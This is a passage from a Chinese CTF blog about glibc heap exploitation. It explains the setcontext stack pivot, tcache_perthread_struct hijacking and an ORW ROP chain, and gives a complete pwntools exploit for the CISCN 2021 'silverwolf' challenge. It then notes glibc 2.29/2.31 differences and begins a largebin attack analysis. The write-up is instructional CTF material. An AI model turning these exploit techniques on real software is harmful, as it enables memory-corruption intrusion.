class="hljs-comment">; LINUX - sys_rt_sigprocmask</span><br><span class="hljs-symbol">.text:</span>000000000005219C                 <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">rdi</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000005219D</span>                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">rax</span>, <span class="hljs-number">0FFFFFFFFFFFFF001h</span><br><span class="hljs-symbol">.text:</span>00000000000521A3                 <span class="hljs-keyword">jnb</span>     short loc_52200<br><span class="hljs-symbol">.text:</span>00000000000521A5                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0E0h</span>]<br><span class="hljs-symbol">.text:</span>00000000000521AC                 <span class="hljs-keyword">fldenv</span>  <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rcx</span>]<br><span class="hljs-symbol">.text:</span>00000000000521AE                 <span class="hljs-keyword">ldmxcsr</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">1C0h</span>]<br><span class="hljs-symbol">.text:</span>00000000000521B5                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rsp</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0A0h</span>]<br><span class="hljs-symbol">.text:</span>00000000000521BC                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rbx</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">80h</span>]<br><span class="hljs-symbol">.text:</span>00000000000521C3                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rbp</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">78h</span>]<br><span class="hljs-symbol">.text:</span>00000000000521C7                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r12</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">48h</span>]<br><span class="hljs-symbol">.text:</span>00000000000521CB                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r13</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">50h</span>]<br><span class="hljs-symbol">.text:</span>00000000000521CF                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r14</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">58h</span>]<br><span class="hljs-symbol">.text:</span>00000000000521D3                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r15</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">60h</span>]<br><span class="hljs-symbol">.text:</span>00000000000521D7                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0A8h</span>]<br><span class="hljs-symbol">.text:</span>00000000000521DE                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">rcx</span><br><span class="hljs-symbol">.text:</span>00000000000521DF                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rsi</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">70h</span>]<br><span class="hljs-symbol">.text:</span>00000000000521E3                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdx</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">88h</span>]<br><span class="hljs-symbol">.text:</span>00000000000521EA                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">98h</span>]<br><span class="hljs-symbol">.text:</span>00000000000521F1                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r8</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">28h</span>]<br><span class="hljs-symbol">.text:</span>00000000000521F5                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r9</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">30h</span>]<br><span class="hljs-symbol">.text:</span>00000000000521F9                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">68h</span>]<br><span class="hljs-symbol">.text:</span>00000000000521F9 <span class="hljs-comment">; &#125; // starts at 52180</span><br><span class="hljs-symbol">.text:</span>00000000000521FD <span class="hljs-comment">; __unwind &#123;</span><br><span class="hljs-symbol">.text:</span>00000000000521FD                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span>00000000000521FF                 <span class="hljs-keyword">retn</span><br></code></pre></td></tr></table></figure><p>这个函数都是通过rdi寄存器进行赋值操作，对于glibc-2.27版本我们通常从setcontext + 53 开始使用，也就是 mov  rsp, [rdi+0A0h] 那一行，在阅读其他师傅的文章后知道是因为上面的 fldenv byte pte [rcx] 会造成程序执行时直接 crash。</p><p>这里一共有两个关键点，第一个就是给rsp赋值进行栈迁移，第二个就是一个push操作进行压栈。通过这两个我们来控制程序的执行流</p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="劫持tcache-perthread-struct结构体"><a href="#劫持tcache-perthread-struct结构体" class="headerlink" title="劫持tcache_perthread_struct结构体"></a>劫持tcache_perthread_struct结构体</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* We overlay this structure on the user-data portion of a chunk when</span><br><span class="hljs-comment">   the chunk is stored in the per-thread cache.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br>&#125; tcache_entry;<br><span class="hljs-comment">/* There is one of these for each thread, which contains the</span><br><span class="hljs-comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span><br><span class="hljs-comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span><br><span class="hljs-comment">   are redundant (we could have just counted the linked list each</span><br><span class="hljs-comment">   time), this is for performance reasons.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">char</span> counts[TCACHE_MAX_BINS];<br>  tcache_entry *entries[TCACHE_MAX_BINS];<br>&#125; tcache_perthread_struct;<br></code></pre></td></tr></table></figure><p>堆地址的第一个chunk：</p><p>tcache_perthread_struct的chunk头：0x11字节<br>counts数组一共占用64字节,每个字节对应着一个链表,用来存放对应链表中存放着chunk的数量 0x40字节<br>entry指针数组是用来存储每个链表中链表头的chunk地址，一共占用8 * 64字节 0x200字节</p><p>正好0x251字节</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202412102017952.png" alt="image-20241210201758837"></p><p>利用思路：</p><ol><li>控制counts数组，让tcachebins数量改变，从而达到一定效果。例：伪造tcache为堆基地址+0x10，也就是首个chunk，然后改变0x250大小的chunk数量为7，就可以释放伪造chunk进入unsortebin从而泄露libc基地址</li><li>控制enetry指针数组，申请相应大小chunk到指定位置，达到任意地址写的目的</li></ol><h3 id="创建或者释放chunk细节"><a href="#创建或者释放chunk细节" class="headerlink" title="创建或者释放chunk细节"></a>创建或者释放chunk细节</h3><p>当你创建或者释放一个chunk时，此时rdi指针指向chunk的地址</p><h2 id="setcontext打orw攻击思路"><a href="#setcontext打orw攻击思路" class="headerlink" title="setcontext打orw攻击思路"></a>setcontext打orw攻击思路</h2><h3 id="以free-hook布置ROP链"><a href="#以free-hook布置ROP链" class="headerlink" title="以free_hook布置ROP链"></a>以free_hook布置ROP链</h3><p>通过控制enery数组，来控制输入位置</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202411211307142.png" alt="image-20241121130717082"></p><p>最后布置stack_pivot_1然后free掉，就会启动ROP链</p><p>执行流程为：</p><ol><li>free掉chunk调用setcontext，此时rdi指向addr</li><li>mov     rsp, [rdi+0A0h]把rsp指向ORW1处，mov     rcx, [rdi+0A8h]  push  rcx把ret压栈</li><li>setcontext结束直接ret，就能到ORW1执行ROP</li></ol><h2 id="例题讲解"><a href="#例题讲解" class="headerlink" title="例题讲解"></a>例题讲解</h2><p><a href="https://gitee.com/tky5216/CTF/raw/master/PWN/heap/silverwolf.zip">[CISCN 2021 初赛]silverwolf</a></p><p>本题只能操作当前chunk，并且有个UAF，所以要想泄露libc地址，需要改counts数组数量为7，然后free掉才能泄露libc地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br>ls      = <span class="hljs-keyword">lambda</span> data    :log.success(data)<br>lss     = <span class="hljs-keyword">lambda</span> s       :ls(<span class="hljs-string">&#x27;\033[1;31;40m%s ---&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br><br>filename = <span class="hljs-string">&#x27;./silverwolf&#x27;</span><br>url = <span class="hljs-string">&#x27;&#x27;</span><br><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>]<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;([^:\s]+)(?::(\d+)|\s+(\d+))?&#x27;</span>, url)<br>hostname, port = (<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>), <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">3</span>)) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">else</span> (<span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>)<br>p = (remote(hostname, port) <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;re&#x27;</span> <span class="hljs-keyword">else</span> process(filename))<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;de&#x27;</span>:<br>    gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    b * main</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    gdb.attach(p, gdbscript=gdbscript)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GDB attached successfully&quot;</span>)    <br>elf = ELF(filename)<br>libc = ELF(<span class="hljs-string">&#x27;libc-2.27.so&#x27;</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">1.allocate                                                                                                            </span><br><span class="hljs-string">2.edit                                                                                                                </span><br><span class="hljs-string">3. show</span><br><span class="hljs-string">4. delete</span><br><span class="hljs-string">5. exit</span><br><span class="hljs-string">Your choice: </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>) :<br>  p.sendlineafter(<span class="hljs-string">&#x27;Your choice: &#x27;</span> , <span class="hljs-string">b&#x27;1&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span> , <span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>))<br>  p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span> , <span class="hljs-built_in">str</span>(size))<br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">content</span>) :<br>  p.sendlineafter(<span class="hljs-string">&#x27;Your choice: &#x27;</span> , <span class="hljs-string">b&#x27;2&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span> , <span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>))<br>  p.sendlineafter(<span class="hljs-string">&#x27;Content: &#x27;</span> , content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>() :<br>  p.sendlineafter(<span class="hljs-string">&#x27;Your choice: &#x27;</span> , <span class="hljs-string">b&#x27;3&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span> , <span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>))<br>  p.recvuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>() :<br>  p.sendlineafter(<span class="hljs-string">&#x27;Your choice: &#x27;</span> , <span class="hljs-string">b&#x27;4&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span> , <span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>))<br> <br>add(<span class="hljs-number">0x78</span>)<br>free()<br>show()  <span class="hljs-comment">#UAF泄露heap地址</span><br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x11b0</span><br><br>edit(p64(heap_base + <span class="hljs-number">0x10</span>))  <span class="hljs-comment">#劫持tcache_perthread_struct</span><br>add(<span class="hljs-number">0x78</span>)<br>add(<span class="hljs-number">0x78</span>)<br>edit(p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(<span class="hljs-number">0x7000000</span>))  <span class="hljs-comment">#控制0x250大小的chunk数量为7</span><br>free()  <span class="hljs-comment">#进入unsertbins</span><br>show()<br><br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x70</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><br>edit(p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(<span class="hljs-number">0</span>))<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br><br>pop_rax = libc_base + <span class="hljs-number">0x43AE8</span><br>pop_rdi = libc_base + <span class="hljs-number">0x215BF</span><br>pop_rsi = libc_base + <span class="hljs-number">0x23EEA</span><br>pop_rdx = libc_base + <span class="hljs-number">0x1B96</span><br>read = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">53</span><br>syscall = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>] + <span class="hljs-number">0xf</span><br>flag_addr = heap_base + <span class="hljs-number">0x1000</span><br>ret = libc_base + <span class="hljs-number">0x8AA</span><br><br>orw1 = heap_base + <span class="hljs-number">0x3000</span><br>orw2 = heap_base + <span class="hljs-number">0x3060</span><br><br>stack_pivot_1 = heap_base + <span class="hljs-number">0x2000</span><br>stack_pivot_2 = heap_base + <span class="hljs-number">0x20A0</span><br><span class="hljs-comment">#控制enery数组的值</span><br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">8</span>    <br>payload += p64(free_hook)  <span class="hljs-comment"># 0x20</span><br>payload += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#30</span><br>payload += p64(flag_addr) <span class="hljs-comment">#40</span><br>payload += p64(stack_pivot_1) <span class="hljs-comment">#50</span><br>payload += p64(stack_pivot_2) <span class="hljs-comment">#60</span><br>payload += p64(orw1) <span class="hljs-comment">#70</span><br>payload += p64(orw2) <span class="hljs-comment">#80</span><br><br>edit(payload)<br>lss(<span class="hljs-string">&#x27;heap_base&#x27;</span>)<br>lss(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br>lss(<span class="hljs-string">&#x27;syscall&#x27;</span>)<br><br><span class="hljs-comment"># Open</span><br><br>orw = p64(pop_rdi) + p64(flag_addr)<br>orw += p64(pop_rax) + p64(<span class="hljs-number">2</span>)<br>orw += p64(pop_rsi) + p64(<span class="hljs-number">0</span>)<br>orw += p64(syscall)<br><br><span class="hljs-comment"># Read</span><br><br>orw += p64(pop_rdi) + p64(<span class="hljs-number">3</span>)<br>orw += p64(pop_rsi) + p64(orw1)<br>orw += p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)<br>orw += p64(read)<br><br><span class="hljs-comment"># Write</span><br><br>orw += p64(pop_rdi) + p64(<span class="hljs-number">1</span>)<br>orw += p64(write)<br><br>add(<span class="hljs-number">0x18</span>)<br><br>edit(p64(setcontext))<br><br>add(<span class="hljs-number">0x38</span>)<br>edit(<span class="hljs-string">&#x27;./flag&#x27;</span>)<br><br>pause()<br>add(<span class="hljs-number">0x68</span>)<br>edit(orw[:<span class="hljs-number">0x60</span>])<br><span class="hljs-comment"># orw1</span><br>add(<span class="hljs-number">0x78</span>)<br>edit(orw[<span class="hljs-number">0x60</span>:])<br><span class="hljs-comment"># orw2</span><br><br>add(<span class="hljs-number">0x58</span>)<br><span class="hljs-comment"># stack_pivot_2</span><br>edit(p64(orw1) + p64(ret))<br>add(<span class="hljs-number">0x48</span>)<br><span class="hljs-comment"># # stack_pivot_1</span><br>free()<br><br>p.interactive()<br><br><br><br></code></pre></td></tr></table></figure><h2 id="补充说明"><a href="#补充说明" class="headerlink" title="补充说明"></a>补充说明</h2><p>前面由于之学了老版本，发现还是不够用，现在分析记录一下新版本</p><h2 id="glibc2-29版本及其以前"><a href="#glibc2-29版本及其以前" class="headerlink" title="glibc2.29版本及其以前"></a>glibc2.29版本及其以前</h2><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202412102020743.png" alt="image-20241210202044655"></p><p>setcontext的变化，这里看一下glibc-2.29，可以看到由原来的rdi + 偏移改成了 <strong>rdx + 偏移</strong> ，直接覆盖free_hook为setcontext无法完成赋值</p><p>这里需要中转，先用rdi给rdx赋值，再利用setcontext，但是free_hook只有一次写的机会，所以写入的gadget必须同时完成这两个操作 &#x3D;&#x3D;&gt; 1. 先用rdi给rdx赋值 2. 调用setcontext+53</p><p>这里介绍几个有用的gadget，用来覆盖free_hook，实现栈迁移：</p><p>搜索命令：ROPgadget –binary libc-2.31.so –only “mov|call” | grep -E “: mov rdx, qword ptr [rdi”</p><h2 id="glibc2-31版本"><a href="#glibc2-31版本" class="headerlink" title="glibc2.31版本"></a>glibc2.31版本</h2><p>和之前版本的区别是setcontext 的位置变成了 setcontext+61</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202412112044544.png" alt="image-20241211204422473"></p>]]></content>
    
    
    <categories>
      
      <category>堆</category>
      
    </categories>
    
    
    <tags>
      
      <tag>setcontext打orw</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于高低版本的largebin attack攻击</title>
    <link href="/2024/11/06/%E5%85%B3%E4%BA%8E%E9%AB%98%E4%BD%8E%E7%89%88%E6%9C%AC%E7%9A%84largebin-attack%E6%94%BB%E5%87%BB/"/>
    <url>/2024/11/06/%E5%85%B3%E4%BA%8E%E9%AB%98%E4%BD%8E%E7%89%88%E6%9C%AC%E7%9A%84largebin-attack%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="关于高低版本的largebin-attack攻击"><a href="#关于高低版本的largebin-attack攻击" class="headerlink" title="关于高低版本的largebin attack攻击"></a>关于高低版本的largebin attack攻击</h1><h2 id="低版本largebin-arrack攻击"><a href="#低版本largebin-arrack攻击" class="headerlink" title="低版本largebin arrack攻击"></a>低版本largebin arrack攻击</h2><p>此处适用的版本为2.23~2.30</p><p>下面是对glibc2.23源码的分析（由于自己画不出这种效果借鉴了大佬的图)</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202411062011549.png" alt="在这里插入图片描述"></p><p>逻辑还是非常清晰的我把它简单分为一下几个过程：</p><ol><li>从unsorted bin链中取出的chunk大小，是否属于small bin的大小<ul><li>small bin相关的处理</li></ul></li><li>从unsorted bin链中取出的chunk大小，是否属于large bin的大小<ul><li>计算出当前chunk大小从属的main_arean-&gt;bins的下标</li><li>获取该bins下标的large bin的头结点 <code>bck</code></li><li>通过large bin头节点的fd，找到large bin链中size最大的chunk <code>fwd</code>（large bin链中第一个chunk）</li><li>当前large bin链不为空（操作的是fd_nextsize和bk_nextsize形成的链）<ul><li>当前chunk的size &lt; large bin链中最小的chunk<ul><li>（<code>总结：将当前chunk插入到large bin链的尾部，即插入到最小的chunk的后面</code>）</li><li><code>fwd = bck;</code> 令 fwd 指向 large bin 头结点</li><li><code>bck = bck-&gt;bk;</code> 令 bck 指向 largin bin 尾部 chunk，就是当前已在large bin链中最小的这个chunk</li><li><code>victim-&gt;fd_nextsize = fwd-&gt;fd;</code> 当前chunk 的 fd_nextsize 指向 largin bin 的第一个 chunk</li><li><code>victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</code> 当前chunk的 bk_nextsize 指向原来链表的第一个 chunk 指向的 bk_nextsize（当前chunk的bk_nextsize指向原先最小的chunk）</li><li>fwd-&gt;fd-&gt;bk_nextsize &#x3D; victim-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; victim;<ul><li><code>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</code> 原先最小chunk的fd_nextsize指向当前chunk</li><li><code>fwd-&gt;fd-&gt;bk_nextsize = victim</code> large bin中第一个chunk的bk_nextsize指向当前chunk</li></ul></li></ul></li><li>当前chunk的size &gt;&#x3D; large bin链中最小的chunk<ul><li>从large bin链中size最大的chunk <code>fwd</code>（large bin链中第一个chunk），从大到小遍历，找到首个不大于当前chunk的chunk</li><li>如果找到的chunk的大小 <code>=</code> 当前chunk<ul><li><code>fwd = fwd-&gt;fd;</code>将当前chunk 插入到该chunk的后面，并不修改 nextsize 指针</li></ul></li><li>如果找到的chunk的大小 <code>&lt;</code> 当前chunk<ul><li><code>victim-&gt;fd_nextsize = fwd;</code> 当前chunk的fd_nextsize指向这个找到的chunk</li><li><code>victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</code> 当前chunk的bk_nextsize指向这个找到的chunk的bk_nextsize</li><li><code>fwd-&gt;bk_nextsize = victim;</code> 找到chunk的bk_nextsize指向当前chunk</li><li><code>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</code> 找到chunk原先前面的chunk的fd_nextsize指向当前chunk</li></ul></li><li>获取找到的chunk的前面的一个chunk（通过bk找到当前chunk插入前，最小的比找到的chunk大的chunk）</li></ul></li></ul></li><li>当前large bin链为空（操作的是fd_nextsize和bk_nextsize形成的链）<ul><li>当前chunk的<code>fd_nextsize</code>和<code>bk_nextsize</code>均指向自己</li></ul></li></ul></li><li>将当前chunk链入large bin链中（<code>fd,bk形成的链</code>）</li></ol><p>下面<code>通过被破坏的large bin chunk实现漏洞利用</code>的角度来观察不同入链的逻辑（<code>一般是堆溢出修改large bin的fd,bk,fd_nextsize,bk_nextsize</code>）</p><h3 id="1）首个chunk入large-bin链"><a href="#1）首个chunk入large-bin链" class="headerlink" title="1）首个chunk入large bin链"></a>1）首个chunk入large bin链</h3><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202411062151362.png" alt="在这里插入图片描述"></p><ul><li>此时还没有被破坏的chunk</li><li>large bin fd，large bin bk 指向这个chunk的首地址</li><li>chunk的fd,bk指向large bin 头结点的首地址</li><li>fd_nextsize，bk_nextsize指向chunk自身</li></ul><h3 id="2）比最小的chunk还小的chunk入large-bin链"><a href="#2）比最小的chunk还小的chunk入large-bin链" class="headerlink" title="2）比最小的chunk还小的chunk入large bin链"></a>2）比最小的chunk还小的chunk入large bin链</h3><p>先看看该入链逻辑所涉及的代码，<code>寻找可被破坏-用于利用的chunk(从而有堆溢出产生时，构造这种堆结构)</code>，<code>以及利用方式</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">else</span><br>  &#123;<br>    victim_index = largebin_index (size);<br>    bck = bin_at (av, victim_index);【<span class="hljs-number">1</span>】<br>    fwd = bck-&gt;fd;【<span class="hljs-number">2</span>】<br>    <span class="hljs-keyword">if</span> (fwd != bck)<br>      &#123;<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunksize_nomask (bck-&gt;bk))<br>          &#123;<br>            fwd = bck;  【<span class="hljs-number">3</span>】<br>            bck = bck-&gt;bk;  【<span class="hljs-number">4</span>】<br><br>            victim-&gt;fd_nextsize = fwd-&gt;fd; 【<span class="hljs-number">5</span>】<br>            victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;【<span class="hljs-number">6</span>】<br>            fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;【<span class="hljs-number">7</span>】<br>          &#125;<br><br>mark_bin (av, 